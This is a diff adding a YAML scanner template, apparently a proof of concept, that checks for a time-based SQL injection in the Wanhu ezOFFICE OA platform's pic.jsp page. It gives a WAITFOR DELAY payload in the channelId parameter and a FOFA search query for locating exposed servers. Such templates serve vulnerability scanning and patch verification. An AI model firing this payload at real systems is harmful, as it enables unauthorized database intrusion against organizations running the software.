@@ -1,0 +1,25 @@
+id: poc-yaml-wanhu-oa-pic-jsp-sqli
+info:
+  name: 万户OA协同办公平台 pic.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + 1
+requests:
+- method: GET
+  path: /defaultroot/platform/portal/portlet/pic/pic.jsp?channelId=1%27;WAITFOR%20DELAY%20%270:0:{{.t1}}%27--&num=1
+  expression: 'status_code == 200 &&
+
+    contains(body,"/defaultroot/scripts/main/whir.validation.js") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
